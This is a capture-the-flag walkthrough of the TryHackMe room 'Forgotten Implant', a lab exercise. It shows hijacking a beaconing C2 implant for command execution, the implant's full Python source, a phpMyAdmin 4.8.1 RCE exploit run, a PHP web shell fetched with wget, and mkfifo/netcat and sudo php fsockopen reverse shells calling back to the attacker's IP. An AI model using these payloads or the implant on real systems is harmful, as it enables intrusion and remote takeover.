---
title: Forgotten Implant
date: 2021-08-01 12:00:00
categories: [CTF, TryHackMe]
tags: [wireshark]     # TAG names should always be lowercase
---
<style>
  :term {
    # --color-primary: {{ settings.color_primary }};
    --color-body-text: {{ settings.color_body_text }};
    --color-main-background: {{ blue }};
  }
</style>
![](https://tryhackme-images.s3.amazonaws.com/room-icons/1968fc18c7598f797954065d05a7f8f0.png)

## Enumeration


We start this adventure as usual with an nmap scan, but the result shows all ports closed. Even more lengthy / intensive scans give the same result.


```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nmap 10.10.115.84
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 17:08 EDT
Nmap scan report for 10.10.115.84
Host is up (0.089s latency).
All 1000 scanned ports on 10.10.115.84 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
```

We were offered a hint for this box that we're worknig with an implant from a C2 platform. Those implants tend to beacon out rather than listen, so let's look for a beacon.

We run Wireshark and listen on our VPN at `tun0`, killing any leftover nmap sessions to limit the noise from the rest of the network. We see that the machine is trying to call us on port 81. It must know our IP due to the port scan earlier. 

![](/assets/forgotten-implant/Untitled.png)

Let’s start a netcat listener to give it something to connect to:

```bash
──(user㉿kali-linux-2022-2)-[~]
└─$ nc -lvp 81
listening on [any] 81 ...
10.10.115.84: inverse host lookup failed: Unknown host
connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 43784
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTI6MDIuMDg5NDc3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.6.74.177:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

We're receiving an HTTP GET call to a `heartbeat` endponit and a long filename that looks like base 64. Decoding it we find a ststus message. 

```json
{"time": "2023-08-02T21:12:02.089477", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_jo_id": 0, "cmd": "whoami"}, "success": false}
```

Let's start an HTTP server so that we can respond to the GET. 

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ python -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.115.84 - - [02/Aug/2023 17:16:02] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:16:02] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTY6MDEuNzk2NjQ5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.115.84 - - [02/Aug/2023 17:16:03] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:16:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
10.10.115.84 - - [02/Aug/2023 17:17:01] code 404, message File not found
10.10.115.84 - - [02/Aug/2023 17:17:01] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDJUMjE6MTc6MDEuNjUwODk3IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -                                            
10.10.115.84 - - [02/Aug/2023 17:17:03] code 404, message File not found                                        
10.10.115.84 - - [02/Aug/2023 17:17:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
```

Soon after starting the server we see calls coming in for the  `heartbeat` endponit as well as a new one to `get-job`. The filename at the end of the `get-job` endponit decodes to `"latest"`, suggesting we can provide new job instructions here. 

## Foothold

To begin interacting with the endponit, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. 

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ mkdir get-job

┌──(user㉿kali-linux-2022-2)-[~]
└─$ echo 'ls' > get-job/ImxhdGVzdCI=
```
After a brief wait we see the implant call our file, followed by a second call to a new endpoint `job-result`!

```bash
10.10.115.84 - - [02/Aug/2023 17:31:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ==
```

Decoding the base 64 we see `{"success": false, "result": "Encoding error"}`

OK, so it wants base 64. On the next round we send:

`echo 'ls' | base64 > get-job/ImxhdGVzdCI=`

and get back:

`{"success": false, "result": "JSON error"}`

Let’s try the JSON format we received in the heartbeat message. We submit:

`echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`

and get back:

`{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`

We've achieved RCE and found the first flag already, let's grab it right now!

Send:

`echo '{"job_id": 0, "cmd": "cat user.txt"}' | base64 > get-job/ImxhdGVzdCI=`

Receive:

`{"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}`

## Initial Shell

Some of the more popular shells don’t seem to work on this box but eventually we find one that does. We set a listener and send the below payload to get a shell as ada:  

```json
{"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.74.177 4444 >/tmp/f"}
```




## Local Enumeration

### ada's home

There is a Python script in our home directory. 

```python
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='[redacted]'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```

We enumerate the database locally using the credentuals here but find nothing interesting. The credentials also don't work to `sudo` or `su` to any of our other users. 

We also have a hidden directory `.implant` off of ada's home, containing the malware that we're connecting through. An interesting read, but we're already in ada's account so nothing to exploit here.  

<details>
<summary>.implant.py</summary>

{% highlight python %}
import base64
import binascii
import json
import platform
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests

def systeminfo():
    return {
        'os': platform.system(),
        'hostname': platform.node(),
    }

class Commander:
    def __init__(self, host, log_dir, port=81):
        self.log_dir = Path(log_dir)
        self.log_file = self.log_dir / f'{host}.log'
        self.port = port
        self.host = host

        try:
            self.log = json.loads(self.log_file.read_text())
        except FileNotFoundError:
            self.log = {'heartbeats': [], 'jobs': [{'job_id': 0, 'cmd': 'whoami'}]}
            self.save_log()

    def encode_message(self, message):
        return base64.b64encode(message.encode('utf-8')).decode('utf-8')

    def decode_message(self, message):
        return base64.b64decode(message).decode('utf-8')
    
    def save_log(self):
        self.log_file.write_text(json.dumps(self.log))

    def send_c2_message(self, endpoint, message):
        try:
            message = self.encode_message(json.dumps(message))
            r = requests.get(f'http://{self.host}:{self.port}/{endpoint}/{message}')

            return r.text
        except requests.exceptions.ConnectionError:
            raise ConnectionError('Could not connect to C2')

    def send_heartbeat(self):
        heartbeat = {
            'time': datetime.now().isoformat(),
            'systeminfo': systeminfo(),
            'latest_job': self.log['jobs'][-1] if len(self.log['jobs']) > 0 else None,
            'success': False
        }

        try:
            self.send_c2_message('heartbeat', heartbeat)

            heartbeat['success'] = True
            self.log['heartbeats'].append(heartbeat)
        except ConnectionError:
            self.log['heartbeats'].append(heartbeat)
            print('Could not send heartbeat')

    def execute_cmd(self, command):
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
            output, err = p.communicate()
            return output.decode('utf-8')
        except Exception as e:
            print(e)
            return False

    def get_job(self, job_id='latest'):
        try:
            job = self.send_c2_message('get-job', job_id)
            job = json.loads(self.decode_message(job))
            self.log['jobs'].append(job)

            if 'cmd' in job:
                job['success'] = True
                job['result'] = self.execute_cmd(job['cmd'])
                self.send_c2_message('job-result', job)
            else:
                job['success'] = False
                job['result'] = 'No command'
                self.send_c2_message('job-result', job)
        except ConnectionError:
            print('Could not get job')
        except TypeError:
            print('Job formatting error')
        except json.JSONDecodeError:
            job = {'success': False, 'result': 'JSON error'}
            self.send_c2_message('job-result', job)
            print('JSON error')    
        except binascii.Error:
            job = {'success': False, 'result': 'Encoding error'}
            self.send_c2_message('job-result', job)
            print('Encoding error')
        except Exception as e:
            print(f'Job execution error ({e})')

if __name__ == "__main__":
    log_dir = Path('/home/ada/.implant')
    hosts_file = Path('/home/ada/.implant/hosts')

    if hosts_file.exists():
        hosts = hosts_file.read_text().split('\n')

        commanders = [Commander(host, log_dir) for host in hosts if host != '']

        for commander in commanders:
            commander.send_heartbeat()
            time.sleep(1)
            commander.get_job()
            commander.save_log()

{% end highlight %}
</details>

### fi's home

Enumerating fi’s home directory we can see that he has `sudo` permissions. This looks like a good account to transition to if we can find a path. 

```bash
ada@forgottenimplant:/home/fi$ ls -la

total 148
drwxr-xr-x 6 fi   fi    4096 Apr 29 15:09 .
drwxr-xr-x 4 root root  4096 Jul 12  2022 ..
lrwxrwxrwx 1 fi   fi       9 Jul 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 fi   fi     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 fi   fi    3771 Feb 25  2020 .bashrc
drwx------ 3 fi   fi    4096 Jul 12  2022 .cache
drwxrwxr-x 4 fi   fi    4096 Apr 14 15:50 .config
drwxrwxr-x 3 fi   fi    4096 Jul 10  2022 .local
-rw-r--r-- 1 fi   fi     807 Feb 25  2020 .profile
lrwxrwxrwx 1 fi   fi       9 Jul 10  2022 .python_history -> /dev/null
-rwxrwxr-x 1 fi   fi     270 Apr 14 15:52 sanitize.sh
-rw-rw-r-- 1 fi   fi      66 Jul 12  2022 .selected_editor
-rw-r--r-- 1 root root 94981 Aug  2 22:17 sniffer.log
-rwxrwxr-x 1 fi   fi    2106 Apr 29 14:33 sniffer.py
drwx------ 2 fi   fi    4096 Jul 10  2022 .ssh
-rw-r--r-- 1 fi   fi       0 Jul 10  2022 .sudo_as_admin_successful
```


### 🐰 Rabbit Hole: Python Library Hijacking

There is a python file in fi's home named `sniffer.py`. This is the code that detected our `nmap` scan and started the implant callnig out to us. It would require elevated permissions to run the networknig code, and seeing it's log owned and wrtten to by root is a good indication that this would be a nice attack vector. Alas, it seems to be well secured from Python library hijacking and we aren't privy to the job launching it. 





## Become www-data

We seem to have run out of likely paths to become fi, let’s look for another option. 

Running `curl 127.0.0.1` we see phpMyAdmin on port 80. 

### Intended Path

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ searchsploit   phpmyadmin 4.8.1                                                                           
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                   | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                   | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                | php/webapps/50457.py
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(user㉿kali-linux-2022-2)-[~]
└─$              
```

upload and run
```bash
ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app s4Ucbrme id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
We can upload our shell of choice and call it with this script to obtain a new shell as www-data.

### Alternate Path

In most challenges we’re trying to elevate OUT of the www-data account, lets look for an easier way in considering we already have a shell.

Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder.

```bash
cd phpmyadmin/
ada@forgottenimplant:/var/www/phpmyadmin$ ls -la

total 908
drwxrwxr-x 15     1002     1002   4096 Jul 12  2022 .
drwxr-xr-x  4 root     root       4096 Jul 12  2022 ..
-rw-rw-r--  1 www-data www-data   1578 May 25  2018 ajax.php

[...]

drwxrwxr-x 19 www-data www-data   4096 May 25  2018 templates
drwxrwxr-x  6 www-data www-data   4096 May 25  2018 test
drwxrwxr-x  4 www-data www-data   4096 May 25  2018 themes
-rw-rw-r--  1 www-data www-data    956 May 25  2018 themes.php
drwxrwxrwx  3 www-data www-data   4096 Jul 12  2022 tmp
-rw-rw-r--  1 www-data www-data   1910 May 25  2018 transformation_overview.php
-rw-rw-r--  1 www-data www-data   4617 May 25  2018 transformation_wrapper.php
-rw-rw-r--  1 www-data www-data   1316 May 25  2018 url.php
-rw-rw-r--  1 www-data www-data   1943 May 25  2018 user_password.php
drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
-rw-rw-r--  1 www-data www-data   1085 May 25  2018 version_check.php
-rw-rw-r--  1 www-data www-data   5531 May 25  2018 view_create.php
-rw-rw-r--  1 www-data www-data   3875 May 25  2018 view_operations.php
-rw-rw-r--  1 www-data www-data  29031 May 25  2018 yarn.lock
ada@forgottenimplant:/var/www/phpmyadmin$
```

A quick test to prove that the folder is accessable:

```bash
ada@forgottenimplant:/var/www/phpmyadmin$ echo "hello" > tmp/hi.html

ada@forgottenimplant:/var/www/phpmyadmin$ curl 127.0.0.1/tmp/hi.html

hello
```

Looks good. Let’s upload a PHP shell and trigger it with curl:

```bash
ada@forgottenimplant:/var/www/phpmyadmin/tmp$ wget 10.6.74.177/shell.php

--2023-08-02 22:32:12--  http://10.6.74.177/shell.php
Connecting to 10.6.74.177:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php           100%[===================>]   5.36K  --.-KB/s    in 0.001s  

2023-08-02 22:32:12 (4.64 MB/s) - ‘shell.php’ saved [5493/5493]

ada@forgottenimplant:/var/www/phpmyadmin/tmp$ curl 127.0.0.1/tmp/shell.php
```

With the above we receive a connection back in our new shell as www-data.

## Become root

```bash
$ sudo -l
Matching Defaults entries for www-data on forgottenimplant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on forgottenimplant:
    (root) NOPASSWD: /usr/bin/php
```

To leverage this, we’ll start one more listener on an empty port, then make a call back via PHP with `sudo` : 

```bash
www-data@forgottenimplant:/$ sudo php -r '$sock=fsockopen("10.6.74.177",4447);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Finally we see that beautiful hashtag prompt!

```bash
┌──(user㉿kali-linux-2022-2)-[~]
└─$ nc -lvp 4447
listening on [any] 4447 ...
10.10.115.84: inverse host lookup failed: Unknown host
connect to [10.6.74.177] from (UNKNOWN) [10.10.115.84] 60730
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```
